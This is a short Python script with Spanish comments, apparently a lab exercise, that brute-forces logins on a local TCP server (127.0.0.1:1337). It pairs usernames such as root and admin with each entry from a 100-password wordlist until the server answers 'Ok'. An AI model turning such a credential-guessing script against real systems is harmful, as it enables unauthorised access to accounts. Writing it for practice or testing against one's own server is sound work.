# Enrique Adrian Gonzalez Martinez
# script que con fuerza bruta encuentra la contraseña
# de un usuario en el servidor indicado
# 31/10/2020 1:10 p.m.
import socket

direccion = ('127.0.0.1', 1337)
usrs = ["root","admin","scott","dummy","romeo"]
contras = open("100passwords.txt",'r',errors='ignore').readlines()
contras = list(map(str.strip, contras))

for usr in usrs:
    print(f'User: {usr}')
    for contra in contras:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as cliente:
            cliente.connect(direccion)
            cliente.send(usr.encode())
            print(cliente.recv(1024).decode())
            cliente.send(contra.encode())
            respuesta = cliente.recv(1024).decode()
            print(f'{contra:10} {respuesta}')
            if respuesta == "Ok":
                break
